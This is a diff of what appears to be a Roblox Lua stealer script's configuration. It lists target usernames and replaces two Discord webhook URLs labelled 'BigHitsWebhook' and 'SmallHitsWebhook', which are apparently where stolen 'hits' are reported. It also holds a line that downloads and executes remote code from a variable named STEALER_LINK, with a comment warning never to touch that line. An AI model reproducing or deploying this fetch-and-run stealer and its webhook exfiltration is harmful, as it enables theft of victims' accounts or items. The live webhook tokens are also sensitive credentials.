@@ -6,7 +6,7 @@ Usernames = {
     'third',
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1274327417661427803/jdJtCPEHM1llHCPGIOrHDPddbRIBMt3Sah_payVd8oL1Ivbt-Sxf_dReS1rnjgIjcvmp"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1274327417661427803/jdJtCPEHM1llHCPGIOrHDPddbRIBMt3Sah_payVd8oL1Ivbt-Sxf_dReS1rnjgIjcvmp"
+BigHitsWebhook = "https://discord.com/api/webhooks/1400996509368979606/qYefqdhq_WVcFRMyl4yAveDS9GCF3l3shdTYiJpI-msOy3SG6_5eLAvCl3gh0-u2cB16"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1400996509368979606/qYefqdhq_WVcFRMyl4yAveDS9GCF3l3shdTYiJpI-msOy3SG6_5eLAvCl3gh0-u2cB16"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
